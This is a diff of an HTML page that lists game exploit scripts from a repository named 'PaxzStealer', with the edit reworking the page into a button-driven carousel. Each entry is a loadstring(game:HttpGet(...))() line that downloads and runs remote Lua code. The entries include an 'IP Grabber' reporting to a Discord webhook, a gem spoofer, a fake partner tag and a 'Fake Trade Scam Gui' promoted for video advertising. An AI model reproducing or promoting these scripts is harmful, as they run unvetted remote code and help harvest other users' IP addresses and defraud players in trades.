@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Other scripts</title>
   <style>
-    /* Your provided styles */
     body {
       font-family: Arial, sans-serif;
       text-align: center;
@@ -14,78 +13,168 @@
       background-color: #1a1a1a;
       color: #fff;
     }
-    /* ... (other styles) ... */
+    #animationContainer {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+    }
+    h1 {
+      font-size: 48px;
+      margin-top: 50px;
+    }
+    h2 {
+      font-size: 30px;
+      margin-bottom: 20px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 18px;
+      margin: 10px;
+      background-color: #3498db;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease-in-out;
+    }
+    button:hover {
+      background-color: #2980b9;
+    }
+    #scriptContainer {
+      display: none;
+    }
+    .script-content {
+      margin: 20px auto;
+      padding: 20px;
+      max-width: 600px;
+      background-color: rgba(255, 255, 255, 0.1);
+      border-radius: 10px;
+    }
+    #navigation {
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
   <div id="animationContainer">
     <img src="https://wallpapercave.com/wp/wp2760959.gif" alt="Animated Background" style="width: 100%; height: 100vh; object-fit: cover;">
+
+  <div id="scriptContainer">
+    <!-- Paxz Visual Script -->
+    <div class="script-content">
+      <h1>Paxz Visual Script</h1>
+      <p>loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Visual.lua", true))()<br>Key: Paxz</p>
+    </div>
+
+    <!-- Paxz Gem Spoofer -->
+    <div class="script-content">
+      <h1>Paxz Gem Spoofer!</h1>
+      <p>loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz-Gem-Spoofer", true))()</p>
+    </div>
+
+    <!-- Paxz - Gem Tracker -->
+    <div class="script-content">
+      <h1>Paxz - Gem Tracker</h1>
+      <pre>
+        _G.Webhook = "" -- Your Discord webhook
+        _G.Update = 10  -- Convert to a number, not a string
+        _G.EmbedColor = 0x800080  -- Purple color in hexadecimal
+
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/PaxzGemTracker.lua", true))()
+      </pre>
+    </div>
+
+    <!-- Paxz IP Grabber -->
+    <div class="script-content">
+      <h1>Paxz IP Grabber</h1>
+      <pre>
+        _G.Webhook = "" --// Your webhook for the messages
+        _G.Troll = false --// funny things will happen  so set it to true :)
+
+        -- [Script] --
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/IP%20Grabber", true))()
+      </pre>
+    </div>
+
+    <!-- Paxz - My Restaurant -->
+    <div class="script-content">
+      <h1>Paxz - My Restaurant</h1>
+      <p>loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/My%20Restourant", true))()<br>Key: PaxzOnTop</p>
+    </div>
+
+    <!-- Paxz - Auto Yeet -->
+    <div class="script-content">
+      <h1>Paxz - Auto Yeet</h1>
+      <pre>
+        _G.AutoYeet = true -- set true to turn on false to turn off
+
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Auto-Yeet", true))()
+      </pre>
+    </div>
+
+    <!-- Paxz Fake Partner Tag -->
+    <div class="script-content">
+      <h1>Paxz Fake Partner Tag</h1>
+      <pre>
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/FakeTag"))()
+      </pre>
+    </div>
+
+    <!-- Paxz Auto Farm -->
+    <div class="script-content">
+      <h1>Paxz Auto Farm</h1>
+      <pre>
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz-Auto-Farm", true))()
+      </pre>
+    </div>
+
+    <!-- Paxz Fake Trade Scam Gui -->
+    <div class="script-content">
+      <h1>Paxz Fake Trade Scam Gui</h1>
+      <pre>
+        _G.ScriptTitle = "" --// The title of your Gui
+        _G.ScriptCredits = "" --// put here something like made by (your name)
+        -- ... (other settings) ...
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz-Fake-TradeScam-Gui", true))()
+      </pre>
+      <p>This is for Advertise on Youtube, Tiktok, etc. You can show this in your video as a guide for your audience. Remember to use responsibly and with proper permissions.</p>
+    </div>
   </div>
-  <h1>Paxz Visual Script</h1>
-  <p>loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Visual.lua", true))()<br>Key: Paxz</p>
-  <h2>Paxz Gem Spoofer!</h2>
-  <p>loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz-Gem-Spoofer", true))()</p>
-  <h2>Paxz - Gem Tracker</h2>
-  <p>
-    Script:
-    <pre>
-_G.Webhook = "" -- Your Discord webhook
-_G.Update = 10  -- Convert to a number, not a string
-_G.EmbedColor = 0x800080  -- Purple color in hexadecimal
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/PaxzGemTracker.lua", true))()
-    </pre>
-  </p>
- <h2>Paxz IP Grabber</h2>
-  <p>
-    Script:
-    <pre>
-_G.Webhook = "" --// Your webhook for the messages
-_G.Troll = false --// funny things will happen  so set it to true :)
+  <div id="navigation">
+    <button id="prevButton">Previous</button>
+    <button id="nextButton">Next</button>
+  </div>
 
--- [Script] --
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/IP%20Grabber", true))()
-    </pre>
-  </p>
+  <script>
+    const scripts = document.querySelectorAll('.script-content');
+    let currentScriptIndex = 0;
 
-  <h2>Paxz - My Restaurant</h2>
-  <p>loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/My%20Restourant", true))()<br>Key: PaxzOnTop</p>
+    function showScript(index) {
+      scripts.forEach(script => script.style.display = 'none');
+      scripts[index].style.display = 'block';
+    }
 
-  <h2>Paxz - Auto Yeet</h2>
-  <p>
-    Script:
-    <pre>
-_G.AutoYeet = true -- set true to turn on false to turn off
+    function navigateScripts(direction) {
+      currentScriptIndex += direction;
+      if (currentScriptIndex < 0) {
+        currentScriptIndex = 0;
+      } else if (currentScriptIndex >= scripts.length) {
+        currentScriptIndex = scripts.length - 1;
+      }
+      showScript(currentScriptIndex);
+    }
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Auto-Yeet", true))()
-    </pre>
-  </p>
+    const prevButton = document.getElementById('prevButton');
+    const nextButton = document.getElementById('nextButton');
 
-  <h2>Paxz Fake Partner Tag</h2>
-  <p>loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/FakeTag"))()</p>
+    prevButton.addEventListener('click', () => navigateScripts(-1));
+    nextButton.addEventListener('click', () => navigateScripts(1));
 
-  <h2>Paxz Auto Farm</h2>
-  <p>loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz-Auto-Farm", true))()</p>
-
-  <h2>Paxz Fake Trade Scam Gui</h2>
-  <p>
-    <pre>
-_G.ScriptTitle = "" --// The title of your Gui
-_G.ScriptCredits = "" --// put here something like made by (your name)
-
--- Key System Settings --
-_G.KeySystem = false --// set to true for keysystem (if not dont touch anything from the Key System)
-_G.TitleKeySystem = "" --// Title for your keysystem
-_G.Key = "" --// the key for your key system
-_G.KeySystemNote = "" --// Note for your key system
-
--- {Script} --
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz-Fake-TradeScam-Gui", true))()
-    </pre>
-  </p>
-
-  <p>
-    This is for Advertise on Youtube, Tiktok, etc. You can show this in your video as a guide for your audience. Remember to use responsibly and with proper permissions.
-  </p>
+    showScript(currentScriptIndex);
+  </script>
 </body>
 </html>
